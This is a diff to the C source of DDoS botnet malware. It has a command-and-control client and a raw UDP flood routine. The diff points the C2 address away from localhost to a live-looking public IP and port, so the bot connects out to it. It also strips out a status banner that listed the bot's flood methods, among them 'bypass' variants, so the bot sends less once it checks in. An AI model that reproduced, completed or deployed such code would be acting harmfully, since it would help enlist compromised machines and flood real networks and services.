@@ -25,7 +25,7 @@
 #include <sys/utsname.h>
 
 #define BUFFER_SIZE 4096
-#define CNC_IP "127.0.0.1"
+#define CNC_IP "45.134.39.212"
 #define CNC_PORT 4087
 #define MAX_PACKET 65535
 #define MAX_THREADS 500
@@ -486,8 +486,6 @@ void *udp_raw_flood(void *arg) {
             sent_count++;
         } else {
             error_count++;
-            if (error_count < 10 && errno != EPERM && errno != EACCES) {
-            }
             if (errno == EPERM || errno == EACCES) {
                 close(sockfd);
                 return NULL;
@@ -990,23 +988,6 @@ int connect_to_cnc() {
     char info[512];
     snprintf(info, sizeof(info), "INFO:{\"arch\":\"%s\",\"version\":\"%s\",\"root\":%d}\n", arch, version, is_root);
     send(sock, info, strlen(info), 0);
-    
-    char status[1024];
-    snprintf(status, sizeof(status),
-        "\n========================================\n"
-        "  BOT STATUS REPORT\n"
-        "========================================\n"
-        "  ARCHITECTURE : %s\n"
-        "  VERSION      : %s\n"
-        "  ROOT STATUS  : %s\n"
-        "  METHODS      : %s\n"
-        "========================================\n\n",
-        arch,
-        version,
-        is_root ? "YES (ROOT) - RAW METHODS AVAILABLE" : "NO (NON-ROOT) - NORMAL METHODS ONLY",
-        is_root ? "udp, tcp, http, udp-bypass, tcp-bypass, http-bypass" : "udp, tcp, http"
-    );
-    send(sock, status, strlen(status), 0);
     
     return 0;
 }
